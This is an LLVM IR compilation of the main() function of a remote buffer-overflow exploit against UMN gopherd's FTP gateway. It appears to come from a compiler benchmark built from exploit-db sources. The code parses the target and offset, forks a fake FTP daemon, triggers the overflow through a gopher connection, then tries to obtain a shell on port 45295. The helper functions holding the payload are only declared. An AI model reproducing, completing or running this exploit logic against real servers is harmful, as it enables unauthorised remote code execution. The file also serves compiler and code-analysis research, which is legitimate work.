; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22893.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22893.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [170 x i8] c"[*] UMN gopherd[2.x.x/3.x.x]: remote buffer overflow exploit.\0A[*] \22UMN gopherd remote ftp gateway buffer overflow\22\0A[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [60 x i8] c"[!] syntax: %s <hostname[:port]> <local/your_ip> [offset]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"main(): allocating memory failed\00", align 1
@offset_ra = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [58 x i8] c"[*] target: %s:%d - localhost: %s - offset: 0x%.8x(+%u)\0A\0A\00", align 1
@RETADDR = common dso_local global i32 0, align 4
@SIGINT = common dso_local global i32 0, align 4
@sig_ctrlc_wait = common dso_local global i32 0, align 4
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@ftp_pid = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [21 x i8] c"fork() ftpd failure.\00", align 1
@SIG_DFL = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [39 x i8] c"[*] starting ftp daemon. (background)\0A\00", align 1
@.str.6 = private unnamed_addr constant [58 x i8] c"[*] waiting for ftp daemon to finish. (ctrl-c if needed)\0A\00", align 1
@sig_ctrlc_exit = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [21 x i8] c"[!] exploit failed.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i16 70, i16* %6, align 2
  store i32 0, i32* %7, align 4
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([170 x i8], [170 x i8]* @.str, i64 0, i64 0))
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 3
  br i1 %11, label %12, label %18

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.1, i64 0, i64 0), i8* %15)
  %17 = call i32 @exit(i32 1) #3
  unreachable

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i64 @strdup(i8* %21)
  %23 = inttoptr i64 %22 to i8*
  store i8* %23, i8** %8, align 8
  %24 = icmp ne i8* %23, null
  br i1 %24, label %27, label %25

25:                                               ; preds = %18
  %26 = call i32 @printe(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %27

27:                                               ; preds = %25, %18
  store i32 0, i32* %7, align 4
  br label %28

28:                                               ; preds = %47, %27
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %8, align 8
  %31 = call i32 @strlen(i8* %30)
  %32 = icmp ult i32 %29, %31
  br i1 %32, label %33, label %50

33:                                               ; preds = %28
  %34 = load i8*, i8** %8, align 8
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = icmp eq i32 %39, 58
  br i1 %40, label %41, label %46

41:                                               ; preds = %33
  %42 = load i8*, i8** %8, align 8
  %43 = load i32, i32* %7, align 4
  %44 = zext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  store i8 0, i8* %45, align 1
  br label %46

46:                                               ; preds = %41, %33
  br label %47

47:                                               ; preds = %46
  %48 = load i32, i32* %7, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* %7, align 4
  br label %28

50:                                               ; preds = %28
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i64 @index(i8* %53, i8 signext 58)
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %56, label %65

56:                                               ; preds = %50
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i64 @index(i8* %59, i8 signext 58)
  %61 = inttoptr i64 %60 to i8*
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = call i8* @atoi(i8* %62)
  %64 = ptrtoint i8* %63 to i16
  store i16 %64, i16* %6, align 2
  br label %65

65:                                               ; preds = %56, %50
  %66 = load i16, i16* %6, align 2
  %67 = icmp ne i16 %66, 0
  br i1 %67, label %69, label %68

68:                                               ; preds = %65
  store i16 70, i16* %6, align 2
  br label %69

69:                                               ; preds = %68, %65
  %70 = load i32, i32* %4, align 4
  %71 = icmp sgt i32 %70, 3
  br i1 %71, label %72, label %78

72:                                               ; preds = %69
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 3
  %75 = load i8*, i8** %74, align 8
  %76 = call i8* @atoi(i8* %75)
  %77 = ptrtoint i8* %76 to i32
  store i32 %77, i32* @offset_ra, align 4
  br label %78

78:                                               ; preds = %72, %69
  %79 = load i8*, i8** %8, align 8
  %80 = load i16, i16* %6, align 2
  %81 = zext i16 %80 to i32
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 2
  %84 = load i8*, i8** %83, align 8
  %85 = load i32, i32* @RETADDR, align 4
  %86 = load i32, i32* @offset_ra, align 4
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.3, i64 0, i64 0), i8* %79, i32 %81, i8* %84, i32 %85, i32 %86)
  %88 = load i32, i32* @SIGINT, align 4
  %89 = load i32, i32* @sig_ctrlc_wait, align 4
  %90 = call i32 @signal(i32 %88, i32 %89)
  %91 = load i32, i32* @SIGALRM, align 4
  %92 = load i32, i32* @sig_alarm, align 4
  %93 = call i32 @signal(i32 %91, i32 %92)
  %94 = call i32 (...) @fork()
  store i32 %94, i32* @ftp_pid, align 4
  switch i32 %94, label %103 [
    i32 -1, label %95
    i32 0, label %97
  ]

95:                                               ; preds = %78
  %96 = call i32 @printe(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i32 1)
  br label %105

97:                                               ; preds = %78
  %98 = load i32, i32* @SIGINT, align 4
  %99 = load i32, i32* @SIG_DFL, align 4
  %100 = call i32 @signal(i32 %98, i32 %99)
  %101 = call i32 (...) @ftpd()
  %102 = call i32 @_exit(i32 0) #3
  unreachable

103:                                              ; preds = %78
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.5, i64 0, i64 0))
  br label %105

105:                                              ; preds = %103, %95
  %106 = load i8*, i8** %8, align 8
  %107 = load i16, i16* %6, align 2
  %108 = load i8**, i8*** %5, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 2
  %110 = load i8*, i8** %109, align 8
  %111 = call i32 @gopher_connect(i8* %106, i16 zeroext %107, i8* %110)
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.6, i64 0, i64 0))
  %113 = load i32, i32* @ftp_pid, align 4
  %114 = call i32 @waitpid(i32 %113, i32 0, i32 0)
  %115 = load i32, i32* @SIGINT, align 4
  %116 = load i32, i32* @sig_ctrlc_exit, align 4
  %117 = call i32 @signal(i32 %115, i32 %116)
  %118 = load i8*, i8** %8, align 8
  %119 = call i32 @getshell(i8* %118, i32 45295)
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  %121 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @strdup(i8*) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @index(i8*, i8 signext) #1

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @ftpd(...) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #2

declare dso_local i32 @gopher_connect(i8*, i16 zeroext, i8*) #1

declare dso_local i32 @waitpid(i32, i32, i32) #1

declare dso_local i32 @getshell(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
